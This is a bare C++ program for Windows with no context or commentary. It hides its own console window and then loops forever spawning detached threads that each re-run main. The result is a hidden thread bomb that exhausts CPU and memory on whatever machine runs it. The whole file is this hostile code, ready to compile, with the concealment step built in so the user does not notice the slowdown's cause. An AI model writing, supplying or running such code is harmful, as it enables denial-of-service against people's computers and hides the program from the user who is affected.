#include <bits/stdc++.h>
#include <windows.h>
using namespace std;

WINBOOL HideConsole()
{
    HWND hwndc = GetConsoleWindow();
    return ShowWindow(hwndc, SW_HIDE);
}
int main()
{
    HideConsole();
    while (1)
    {
        thread s(main);
        s.detach();
    }
    return 0;
}